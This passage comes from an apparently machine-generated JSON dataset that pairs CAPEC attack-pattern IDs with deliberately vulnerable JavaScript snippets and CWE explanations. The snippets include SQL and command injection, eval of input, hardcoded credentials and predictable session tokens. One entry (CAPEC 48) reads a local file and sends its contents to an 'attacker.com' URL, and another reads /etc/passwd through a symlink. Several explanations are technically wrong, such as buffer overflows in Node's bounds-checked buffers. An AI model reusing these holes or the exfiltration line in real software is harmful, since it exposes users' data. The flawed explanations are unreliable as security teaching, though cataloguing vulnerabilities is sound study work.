        "description": "This code snippet demonstrates a vulnerable proxy server that can be exploited for HTTP Request Smuggling (CWE-444), HTTP Request/Response Splitting (CWE-113), Server-Side Request Forgery (CWE-918), Cross-Site Request Forgery (CWE-352), and Unintended Proxy or Intermediary (CWE-441). The proxy server forwards a malicious request to the target server, allowing an attacker to smuggle unauthorized requests. The 'Content-Length' header is set to '0\r\n\r\n' to exploit HTTP Request/Response Splitting, and the 'X-Forwarded-For' header is set to a fake IP address to hide the attacker's identity. This code can be used as a starting point to demonstrate the CAPEC and related CWEs."
    },
    {
        "capec_id": "34",
        "code_snippet": "const http = require('http');\nconst express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/vulnerable', (req, res) => {\n  const userInput = req.body.userInput;\n  const maliciousResponse = `HTTP/1.1 200 OK\\r\\nContent-Length: 10\\r\\n\\r\\n<p>Malicious content</p>`;\n  res.write(maliciousResponse);\n  res.end();\n});\n\nhttp.createServer(app).listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable HTTP server that is susceptible to HTTP Response Splitting (CWE-113) and HTTP Request/Response Smuggling (CWE-444). The server takes user input and injects it into an HTTP response without proper sanitization, allowing an attacker to inject malicious HTTP responses. The malicious response is crafted to inject a new HTTP response with malicious content, which can be used to manipulate the user's session or steal sensitive information."
    },
    {
        "capec_id": "35",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-59: Improper Link Resolution Before File Access ('Link Following')\nconst configFile = './config.json';\nconst configData = fs.readFileSync(configFile, 'utf8');\n\n// CWE-94: Improper Control of Generation of Code ('Code Injection')\nconst config = eval('(' + configData + ')');\n\n// CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\nconst template = fs.readFileSync('./template.html', 'utf8');\nconst output = template.replace('{{username}}', config.username);\n\n// CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\nconst dynamicCode = `const userRole = '${config.role}';`;\neval(dynamicCode);\n\n// CWE-97: Improper Neutralization of Server-Side Includes (SSI) Within a Web Page\nconst ssiDirective = `<!--#include virtual=",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that loads a configuration file and a template file, and uses the configuration data to generate dynamic code. The code is vulnerable to code injection, static code injection, eval injection, and server-side include injection. Additionally, the code violates the principle of least privilege, improperly manages ownership of a sensitive file, and switches between different privilege contexts without proper verification."
    },
    {
        "capec_id": "36",
        "code_snippet": "const adminAPI = {\n  deleteDatabase: () => {\n    // No authentication or authorization checks\n    console.log('Database deleted');\n  },\n  createUser: (username, password) => {\n    // No authentication or authorization checks\n    console.log(`User ${username} created`);\n  }\n};\n\n// Undocumented feature: calling adminAPI functions directly\nadminAPI.deleteDatabase();\nadminAPI.createUser('hacker', 'password');",
        "description": "This code snippet demonstrates the CAPEC of invoking unintended interfaces or functionality. The adminAPI object has two functions, deleteDatabase and createUser, which do not perform any authentication or authorization checks (CWE-306, CWE-862). An attacker can invoke these functions directly, exploiting the missing protection mechanism (CWE-693). The code also includes an undocumented feature (CWE-1242) where the adminAPI functions can be called directly, bypassing any intended access controls. This code uses low-level functionality (CWE-695) that is not intended for public use, making it vulnerable to attacks."
    },
    {
        "capec_id": "37",
        "code_snippet": "const sensitiveData = {\n  'creditCardNumber': '1234-5678-9012-3456',\n  'apiKey': 'my_secret_api_key',\n  'username': 'admin',\n  'password': 'my_secret_password'\n};\n\n// CWE-226: Sensitive information not removed before reuse\nlet reusedMemory = sensitiveData;\nreusedMemory.newProperty = 'new_value';\n\n// CWE-311: Missing encryption of sensitive data\nconst unencryptedData = JSON.stringify(sensitiveData);\nconsole.log(unencryptedData);\n\n// CWE-525: Use of web browser cache containing sensitive information\nconst cache = window.localStorage;\n cache.setItem('sensitiveData', unencryptedData);\n\n// CWE-312: Cleartext storage of sensitive information\nconst registry = {\n  'creditCardNumber': sensitiveData.creditCardNumber,\n  'apiKey': sensitiveData.apiKey\n};\n\n// CWE-314: Cleartext storage in the registry\nconst registryKey = 'HKCU\\Software\\MyApp';\nwindow.registry.SetValue(registryKey, 'creditCardNumber', sensitiveData.creditCardNumber);\n\n// CWE-315: Cleartext storage of sensitive information in a cookie\nconst cookie = `sensitiveData=${unencryptedData};`;\ndocument.cookie = cookie;\n\n// CWE-318: Cleartext storage of sensitive information in executable\nconst executableCode = `console.log('${sensitiveData.creditCardNumber}');`;\n\n// CWE-1239: Improper zeroization of hardware register\nconst hardwareRegister = {\n  'creditCardNumber': sensitiveData.creditCardNumber\n};\n\n// CWE-1258: Exposure of sensitive system information due to uncleared debug information\nconst debugInfo = {\n  'creditCardNumber': sensitiveData.creditCardNumber,\n  'apiKey': sensitiveData.apiKey\n};\n\n// CWE-1266: Improper scrubbing of sensitive data from decommissioned device\nconst decommissionedDevice = {\n  'creditCardNumber': sensitiveData.creditCardNumber\n};\n\n// CWE-1272: Sensitive information uncleared before debug/power state transition\nconst debugState = {\n  'creditCardNumber': sensitiveData.creditCardNumber\n};\n\n// CWE-1278: Missing protection against hardware reverse engineering using integrated circuit (IC) imaging techniques\nconst hardwareComponent = {\n  'creditCardNumber': sensitiveData.creditCardNumber\n};\n\n// CWE-1301: Insufficient or incomplete data removal within hardware component\nconst hardwareComponentData = {\n  'creditCardNumber': sensitiveData.creditCardNumber\n};\n\n// CWE-1330: Remanent data readable after memory erase\nconst erasedMemory = sensitiveData;\nerasedMemory.creditCardNumber = 'erased';\nconsole.log(erasedMemory.creditCardNumber); // still readable",
        "description": "This code snippet demonstrates the CAPEC of an attacker examining a target system to find sensitive data that has been embedded within it, using various CWEs related to sensitive information storage and handling. The code includes examples of sensitive data being stored in cleartext, reused without proper clearing, and exposed through various means such as web browser cache, registry, cookies, and executable code. It also demonstrates improper handling of sensitive information during debug/power state transitions, decommissioning of devices, and hardware reverse engineering."
    },
    {
        "capec_id": "38",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\nconst userInput = './maliciousLibrary'; // Attacker-controlled input\nconst searchPath = process.env.PATH;\nconst maliciousPath = path.join(searchPath, userInput);\nconst lib = require(maliciousPath);\nlib.execute();",
        "description": "This code snippet demonstrates the CAPEC pattern of attack where an adversary loads a malicious resource into a program's standard path. The 'userInput' variable is controlled by the attacker and is used to construct a malicious path that is then used to load a library. The 'process.env.PATH' variable is modified to include the malicious path, allowing the attacker to execute arbitrary code."
    },
    {
        "capec_id": "39",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    res.cookie('authToken', username + ':' + password, { httpOnly: false });\n    res.redirect('/protected');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const authToken = req.cookies.authToken;\n  if (authToken) {\n    const [username, password] = authToken.split(':');\n    if (checkCredentials(username, password)) {\n      res.send('Welcome, ' + username);\n    } else {\n      res.status(401).send('Invalid credentials');\n    }\n  } else {\n    res.status(401).send('Not authenticated');\n  }\n});\n\nfunction checkCredentials(username, password) {\n  // Insecurely hardcoded credentials\n  return username === 'admin' && password === 'password';\n}",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that relies on client-side tokens stored in cookies. The 'authToken' cookie is set with the username and password in cleartext, without any encryption or integrity checks. An attacker can manipulate the cookie to bypass authentication or access sensitive information. The code also lacks proper authorization and input validation, making it vulnerable to various attacks."
    },
    {
        "capec_id": "40",
        "code_snippet": "const exec = require('child_process').exec;\nconst userInput = 'echo $PATH > /tmp/output.txt';\nexec('tty > /dev/pts/0 && ' + userInput, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This code snippet demonstrates a command injection vulnerability. It takes user input and executes it as a command on the system, allowing an attacker to inject malicious commands. The 'tty > /dev/pts/0' command is used to write to the terminal device, and the user input is concatenated to the command string. This allows an attacker to send command strings to the target terminal device, hoping that the target user will hit enter and execute the malicious command with their privileges."
    },
    {
        "capec_id": "41",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userAgent = req.headers['user-agent'];\n  const emailHeader = `To: victim@example.com\r\nSubject: Malicious Email\r\nX-Script: <script>alert('XSS')</script>\r\n`; // CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n  const command = `echo ${emailHeader} >> malicious_email.eml`;\n  require('child_process').exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`Email header injected: ${emailHeader}`);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable email header injection attack. The server-side JavaScript code uses the Express.js framework to create an HTTP server. When a GET request is received, it injects a malicious email header containing a script tag, which can lead to XSS attacks. The email header is constructed using user-input data without proper neutralization of escape, meta, or control sequences (CWE-150). The code then executes a system command to create a malicious email file, which can lead to argument injection (CWE-88). The code also lacks proper encoding or escaping of output (CWE-116) and incorrect comparison (CWE-697), making it vulnerable to further attacks. Additionally, the code does not neutralize HTTP headers for scripting syntax (CWE-644), making it vulnerable to HTTP header injection attacks."
    },
    {
        "capec_id": "42",
        "code_snippet": "function mimeConverter(file) {\n  var mimeBuffer = new Buffer(1024);\n  var fileBuffer = fs.readFileSync(file);\n  mimeBuffer.write(fileBuffer, 0, fileBuffer.length);\n  var mimeString = mimeBuffer.toString('utf8');\n  var command = 'echo ' + mimeString + ' > output.txt';\n  child_process.exec(command);\n}\n\nmimeConverter('user-input-file.txt');",
        "description": "This JavaScript code snippet demonstrates a vulnerable MIME conversion routine that can be exploited to cause a buffer overflow and gain control over the system. The code reads a file, converts it to a MIME compatible format, and then executes a command using the converted string. The vulnerabilities present in this code include CWE-120 (Buffer Copy without Checking Size of Input), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File)."
    },
    {
        "capec_id": "43",
        "code_snippet": "const userInput = '\\\\\"<script>alert(1)</script>\\\\\"';\nconst parser1 = (input) => input.replace(/\\\\/g, '');\nconst inputValidator = (input) => !/</.test(input) && !/>/.test(input);\nconst parser2 = (input) => input.replace(/\\\"/g, '\"');\n\nif (inputValidator(parser1(userInput))) {\n  console.log('Input is valid');\n  const parsedInput = parser2(parser1(userInput));\n  console.log(parsedInput);\n} else {\n  console.log('Input is invalid');\n}",
        "description": "This code snippet demonstrates the CAPEC, where an attacker supplies input data that contains sequences of special characters designed to bypass input validation logic. The input validation layer executes before one or more parsing layers, allowing the attacker to provide input that will pass through the input validator but will be converted into something malicious after passing through the parser2. The CWEs embodied in this code snippet include CWE-179, CWE-181, CWE-184, CWE-183, CWE-77, CWE-78, CWE-74, CWE-20, CWE-697, and CWE-707."
    },
    {
        "capec_id": "44",
        "code_snippet": "function processBinaryResource(file) {\n  var buffer = new Buffer(file.length);\n  fs.readFile(file, function(err, data) {\n    if (!err) {\n      buffer.write(data, 0, data.length);\n      // Vulnerable code: no check for buffer overflow\n      var image = new Image();\n      image.src = buffer.toString('base64');\n      // Arbitrary code execution\n      eval(buffer.toString('utf8'));\n    }\n  });\n}\n\n// Example usage:\nprocessBinaryResource('malicious.jpg');",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability in the handling of binary resources, such as image files. The code reads a file into a buffer without checking its size, leading to a potential buffer overflow (CWE-120). The code then uses the buffer to create an image object, which can lead to arbitrary code execution (CWE-119). Additionally, the code relies on the file name and extension to determine its behavior (CWE-646), and does not properly handle alternate data streams (CWE-69). The eval() function is used to execute arbitrary code, which can be exploited by an attacker to gain access to the execution stack."
    },
    {
        "capec_id": "45",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processSymlink(symlinkPath) {\n    const symlinkStat = fs.lstatSync(symlinkPath);\n    if (symlinkStat.isSymbolicLink()) {\n        const symlinkTarget = fs.readlinkSync(symlinkPath);\n        const targetBuffer = new Buffer.alloc(1024);\n        fs.readFile(symlinkTarget, (err, data) => {\n            if (!err) {\n                targetBuffer.write(data, 0, data.length);\n                // No input validation or bounds checking\n                console.log(targetBuffer.toString());\n            }\n        });\n    }\n}\n\n// Create a symbolic link\nfs.symlink('/etc/passwd', 'symlink_to_passwd', (err) => {\n    if (!err) {\n        processSymlink('symlink_to_passwd');\n    }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable code that processes a symbolic link file without proper input validation and bounds checking, leading to a potential buffer overflow. The code creates a symbolic link to a sensitive file (/etc/passwd) and then reads the contents of the target file into a fixed-size buffer without checking the size of the input data. This can cause a buffer overflow if the input data exceeds the buffer size. The code also lacks proper authorization and authentication checks, making it vulnerable to attacks."
    },
    {
        "capec_id": "46",
        "code_snippet": "function parseConfig(config) {\n  var buffer = new Buffer(1024);\n  var configSize = config.length;\n  buffer.write(config, 0, configSize);\n  var configObj = JSON.parse(buffer.toString());\n  return configObj;\n}\n\nvar userInput = '<html><body><script>x=1;</script><br>'.repeat(10000);\nparseConfig(userInput);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The `parseConfig` function takes a configuration string as input and writes it to a buffer of fixed size (1024 bytes) without checking the size of the input. An attacker can craft a malicious input string that exceeds the buffer size, causing a buffer overflow. The `userInput` variable is an example of such a malicious input, which is a large string that repeats a pattern to exceed the buffer size. This code is vulnerable to CWE-120 (Buffer Copy without Checking Size of Input), CWE-118 (Incorrect Access of Indexable Resource), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-680 (Integer Overflow to Buffer Overflow), CWE-733 (Compiler Optimization Removal or Modification of Security-critical Code), and CWE-697 (Incorrect Comparison)."
    },
    {
        "capec_id": "47",
        "code_snippet": "function processInput(input) {\n  var buffer = new Buffer(10);\n  buffer.write(input, 0, 'utf8');\n  return buffer.toString();\n}\n\nvar userInput = 'A'.repeat(100);\nprocessInput(userInput);\n",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The function processInput() takes an input string and writes it to a buffer of fixed size (10 bytes) without checking the size of the input. If the input is larger than the buffer size, it will cause a buffer overflow. In this example, the userInput variable is set to a string of 100 'A's, which will exceed the buffer size and cause a buffer overflow."
    },
    {
        "capec_id": "48",
        "code_snippet": "javascript:var localFile = 'file:///C:/Users/username/Documents/sensitive_data.txt'; var xhr = new XMLHttpRequest(); xhr.open('GET', localFile, true); xhr.onload = function() { if (xhr.status === 200) { var fileContent = xhr.responseText; var maliciousServer = 'http://attacker.com/stealData'; var request = new XMLHttpRequest(); request.open('GET', maliciousServer + '?stolenData=' + encodeURIComponent(fileContent), true); request.send(); } }; xhr.send();",
        "description": "This JavaScript code snippet demonstrates the CAPEC attack by accessing a local file using the file:/// protocol and sending its contents to a malicious server. It exploits CWE-241 by not validating the type of the localFile variable, CWE-706 by using a local file path that resolves to a resource outside of the intended control sphere, CWE-598 by sending sensitive data in the query string of a GET request, CWE-84 by not neutralizing the encoded URI scheme, and CWE-646 by relying on the file name and extension to determine the behavior."
    },
    {
        "capec_id": "49",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst users = {\n  'admin': 'password123',\n  'user': 'ilovecats'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    res.send('Login successful!');\n  } else {\n    res.status(401).send('Invalid username or password');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that allows brute force attacks. The passwords are stored in a recoverable format ( CWE-257 ) and there is no mechanism to prevent excessive authentication attempts ( CWE-307 ). The system also relies on a single factor for authentication ( CWE-654 ) and uses single-factor authentication ( CWE-308 ). The passwords used are weak ( CWE-521 ) and there is no password aging mechanism in place ( CWE-262 ). An attacker can use a brute force attack to try all possible passwords until they succeed."
    },
    {
        "capec_id": "50",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst passwordRecovery = (username) => {\n  const user = getUserByUsername(username);\n  if (user) {\n    const recoveryToken = generateRecoveryToken();\n    sendRecoveryEmail(username, recoveryToken);\n    return true;\n  }\n  return false;\n};\n\nconst generateRecoveryToken = () => {\n  return Math.floor(Math.random() * 1000000);\n};\n\nconst sendRecoveryEmail = (username, recoveryToken) => {\n  const emailBody = `Hi ${username},\\n\\nClick this link to reset your password: <http://example.com/reset-password?token=${recoveryToken}>`;\n  sendEmail(username, emailBody);\n};\n\napp.get('/reset-password', (req, res) => {\n  const token = req.query.token;\n  const user = getUserByRecoveryToken(token);\n  if (user) {\n    res.render('reset-password', { username: user.username });\n  } else {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.post('/reset-password', (req, res) => {\n  const username = req.body.username;\n  const newPassword = req.body.newPassword;\n  updateUserPassword(username, newPassword);\n  res.send('Password reset successfully');\n});",
        "description": "This code snippet demonstrates a weak password recovery mechanism that allows an attacker to gain access to the system with the same privileges as the original user. The recovery token is generated randomly and sent to the user's email, but it is not hashed or salted, making it susceptible to unauthorized interception and retrieval (CWE-522). The mechanism also uses a weak password recovery token that can be easily guessed or brute-forced (CWE-640). Additionally, the system stores passwords in a recoverable format, making them subject to password reuse attacks (CWE-257). The system also lacks strong password requirements, making it easier for attackers to compromise user accounts (CWE-521)."
    },
    {
        "capec_id": "51",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst registry = {\n  'service1': 'http://malicious-service.com/service1',\n  'service2': 'http://malicious-service.com/service2'\n};\n\napp.get('/registry', (req, res) => {\n  res.json(registry);\n});\n\napp.get('/wsdl', (req, res) => {\n  const wsdl = `<?xml version=\"1.0\" encoding=\"UTF-8\"?><definitions xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\" xmlns:tns=\"http://malicious-service.com\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" targetNamespace=\"http://malicious-service.com\"><service name=\"MaliciousService\"><port name=\"MaliciousPort\" binding=\"tns:MaliciousBinding\"><soap:address location=\"http://malicious-service.com/service1\"/></port></service></definitions>`;\n  res.set('Content-Type', 'text/xml');\n  res.send(wsdl);\n});\n\napp.listen(3000, () => {\n  console.log('Malicious registry and WSDL exposure service started');\n});",
        "description": "This code snippet demonstrates a malicious registry service that exposes a poisoned registry and WSDL file. The registry contains malicious service endpoints, and the WSDL file contains sensitive information about the services. The service does not perform proper authorization checks, allowing unauthorized access to the registry and WSDL file. The WSDL file is stored in cleartext, and the registry is not properly secured, making it vulnerable to tampering. This code embodies the CAPEC of a poisoned registry and the related CWEs of improper authorization, injection, protection mechanism failure, cleartext storage in the registry, and exposure of WSDL file containing sensitive information."
    },
    {
        "capec_id": "52",
        "code_snippet": "const userInput = \"hello\\0world\";\nconst fs = require('fs');\nconst filePath = userInput + '.txt';\nfs.writeFileSync(filePath, 'This is a test file.');\nconsole.log(`File created: ${filePath}`);\n",
        "description": "This code snippet demonstrates the CAPEC of embedding null bytes in input to the target software. The userInput variable contains a null byte (\\0) in the middle of the string. When this input is used to create a file, the fs.writeFileSync function will stop processing the input at the null byte, resulting in a file named 'hello' instead of 'helloworld.txt'. This is an example of CWE-158: Improper Neutralization of Null Byte or NUL Character, CWE-20: Improper Input Validation, and CWE-707: Improper Neutralization."
    },
    {
        "capec_id": "53",
        "code_snippet": "const userInput = 'path/to/secret\\u0000file.txt';\nconst filteredInput = userInput.replace(/\\\\/g, '');\nconst fs = require('fs');\nfs.readFile(filteredInput, (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of using an alternate representation of NULL to bypass a filter. The userInput variable contains a path with a NULL byte (\\u0000) embedded in the middle. The filteredInput variable is created by replacing all backslashes with an empty string, which would normally prevent the NULL byte from being interpreted as a string terminator. However, the \\u0000 encoding allows the NULL byte to be preserved, potentially allowing an attacker to access unauthorized files. CWEs 158, 172, 173, 74, 20, 697, and 707 are all relevant to this vulnerability."
    },
    {
        "capec_id": "54",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.get('/users', (req, res) => {\n  const query = 'SELECT * FROM users WHERE name = \\'' + req.query.name + '\\'';\n  db.query(query, (err, rows) => {\n    if (err) {\n      res.status(500).send({ error: err.message });\n    } else {\n      res.send(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet is vulnerable to SQL injection (CWE-89) and exposes sensitive information through data queries (CWE-202). The application uses the HTTP GET method with sensitive query strings (CWE-598) and generates an error message containing sensitive information (CWE-209). An adversary can probe the application's structure by submitting variants of expected queries, potentially returning information beyond what the expected set of queries would provide, as described in the CAPEC."
    },
    {
        "capec_id": "55",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\nconst bcrypt = require('bcrypt');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.post('/register', (req, res) => {\n  const { username, password } = req.body;\n  const hash = bcrypt.hashSync(password, 1); // CWE-916: Insufficient computational effort\n  db.query(`INSERT INTO users (username, password) VALUES (?, ?)`, [username, hash], (err, results) => {\n    if (err) {\n      res.status(500).send({ message: 'Error registering user' });\n    } else {\n      res.send({ message: 'User registered successfully' });\n    }\n  });\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  db.query(`SELECT password FROM users WHERE username = ?`, [username], (err, results) => {\n    if (err) {\n      res.status(500).send({ message: 'Error logging in' });\n    } else if (results.length === 0) {\n      res.status(401).send({ message: 'Invalid username or password' });\n    } else {\n      const storedHash = results[0].password;\n      if (bcrypt.compareSync(password, storedHash)) {\n        res.send({ message: 'Login successful' });\n      } else {\n        res.status(401).send({ message: 'Invalid username or password' });\n      }\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable password storage and authentication system. It uses a weak hashing algorithm with insufficient computational effort (CWE-916), stores passwords in plaintext-equivalent hashes, and relies on single-factor authentication (CWE-308). The system also lacks password aging and expiration mechanisms (CWE-262, CWE-263), and does not enforce strong password requirements (CWE-521). An attacker can use a rainbow table attack to obtain the original passwords from the stored hashes, and then use the obtained passwords to gain access to the system."
    },
    {
        "capec_id": "56",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (username === 'admin' && password === 'password') {\n    // Compiler optimization removal of security-critical code\n    // The 'secure' variable is optimized out by the compiler\n    let secure = true;\n    if (secure) {\n      res.send('Login successful');\n    } else {\n      // Client-side enforcement of server-side security\n      // The client is trusted to send the correct 'authenticated' value\n      const authenticated = req.body.authenticated;\n      if (authenticated) {\n        res.send('Login successful');\n      } else {\n        res.send('Login failed');\n      }\n    }\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started');\n});",
        "description": "This code snippet demonstrates a deprecated CAPEC pattern, which is a duplicate of CAPEC-207. It includes multiple CWEs, such as CWE-592 (Authentication Bypass Issues), CWE-294 (Authentication Bypass by Capture-replay), CWE-733 (Compiler Optimization Removal or Modification of Security-critical Code), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-693 (Protection Mechanism Failure). The code has a vulnerable login system that can be bypassed by capturing and replaying the authentication request, and it also relies on the client to implement security mechanisms, which can be easily tampered with."
    },
    {
        "capec_id": "57",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const username = req.query.username;\n  const password = req.query.password;\n  const userData = getUserDataFromDB(username, password);\n  res.json(userData);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a RESTful API that uses the GET method to retrieve user data, including sensitive information such as username and password, from a database. The API does not properly authenticate the user or verify the integrity of the communication channel, making it vulnerable to attacks. The sensitive information is passed as query string parameters, which can be easily accessed by unauthorized actors. This code embodies the CAPEC and related CWEs, including CWE-300, CWE-287, CWE-693, CWE-598, and CWE-642."
    },
    {
        "capec_id": "58",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/users', (req, res) => {\n  // No authentication or authorization checks\n  const userId = req.query.userId;\n  const userData = getUserData(userId);\n  res.json(userData);\n});\n\napp.put('/users', (req, res) => {\n  // No authentication or authorization checks\n  const userId = req.query.userId;\n  const updatedUserData = req.body;\n  updateUser(userId, updatedUserData);\n  res.json({ message: 'User updated successfully' });\n});\n\napp.delete('/users', (req, res) => {\n  // No authentication or authorization checks\n  const userId = req.query.userId;\n  deleteUser(userId);\n  res.json({ message: 'User deleted successfully' });\n});",
        "description": "This code snippet demonstrates a RESTful API that lacks access control mechanisms, allowing an adversary to perform malicious actions such as reading, updating, or deleting user data without proper authentication or authorization checks. The API uses HTTP GET, PUT, and DELETE methods without verifying the user's privileges, making it vulnerable to privilege escalation and unauthorized data modification."
    },
    {
        "capec_id": "59",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    const sessionId = generateSessionId(); // CWE-330: Insufficiently Random Values\n    res.cookie('sessionId', sessionId, { httpOnly: true });\n    res.send('Logged in successfully');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessionId) {\n    // CWE-290: Authentication Bypass by Spoofing\n    // CWE-346: Origin Validation Error\n    // CWE-488: Exposure of Data Element to Wrong Session\n    // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n    res.send('Welcome, authenticated user!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\nfunction generateSessionId() {\n  // CWE-331: Insufficient Entropy\n  // CWE-6: J2EE Misconfiguration: Insufficient Session-ID Length\n  return Math.floor(Math.random() * 100000); // predictable session ID\n}\n\nfunction checkCredentials(username, password) {\n  // CWE-285: Improper Authorization\n  // CWE-384: Session Fixation\n  // CWE-693: Protection Mechanism Failure\n  return username === 'admin' && password === 'password';\n}",
        "description": "This code snippet demonstrates a vulnerable session management system. The generateSessionId function generates a predictable session ID, which can be exploited by an attacker to perform session hijacking. The checkCredentials function has improper authorization checks, allowing an attacker to bypass authentication. The code also uses persistent cookies containing sensitive information and does not properly validate the origin of requests."
    },
    {
        "capec_id": "60",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'secret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    req.session.username = username;\n    res.send('Login successful');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.send('You are not logged in');\n  }\n});\n\nfunction checkCredentials(username, password) {\n  // Insecurely store credentials in memory\n  const users = {\n    'user1': 'password1',\n    'user2': 'password2'\n  };\n  return users[username] === password;\n}",
        "description": "This code snippet demonstrates a vulnerable session management system. The session ID is not properly validated, allowing an attacker to reuse a stolen session ID to gain unauthorized access. The code uses express-session to manage sessions, but it does not properly invalidate existing sessions, making it vulnerable to session fixation (CWE-384). The checkCredentials function insecurely stores credentials in memory, making it vulnerable to exposure of sensitive information (CWE-200). The code also uses persistent cookies containing sensitive information (CWE-539) and does not properly enforce boundaries between sessions (CWE-488). An attacker can steal a session ID and reuse it to access protected resources, bypassing authentication (CWE-294, CWE-290)."
    },
    {
        "capec_id": "61",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.get('/login', (req, res) => {\n  const sessionId = req.query.sessionId;\n  if (!sessionId) {\n    res.cookie('sessionId', generateRandomSessionId());\n    res.send('Please authenticate');\n  } else {\n    // authenticate user without invalidating existing session identifier\n    const user = authenticateUser(req.query.username, req.query.password);\n    if (user) {\n      res.cookie('sessionId', sessionId);\n      res.send('Authenticated');\n    } else {\n      res.status(401).send('Invalid credentials');\n    }\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessionId) {\n    // use the same session identifier after privilege elevation\n    const adminUser = authenticateAdminUser(sessionId);\n    if (adminUser) {\n      res.send('Welcome, admin!');\n    } else {\n      res.status(403).send('Access denied');\n    }\n  } else {\n    res.status(401).send('Please authenticate');\n  }\n});\n\nfunction generateRandomSessionId() {\n  return Math.random().toString(36).substr(2);\n}\n\nfunction authenticateUser(username, password) {\n  // dummy authentication logic\n  return username === 'admin' && password === 'password';\n}\n\nfunction authenticateAdminUser(sessionId) {\n  // dummy admin authentication logic\n  return sessionId === 'fixed-admin-session-id';\n}",
        "description": "This code snippet demonstrates a session fixation vulnerability. The server generates a session ID and stores it in a cookie when a user visits the login page. However, the server does not invalidate the existing session ID after the user authenticates. An attacker can exploit this by providing a malicious session ID to the user, who then authenticates and elevates the privileges of the session. The attacker can then use the same session ID to access the admin page, bypassing authentication."
    },
    {
        "capec_id": "62",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://example.com/deleteAccount', true);\nxhr.withCredentials = true;\nxhr.send();",
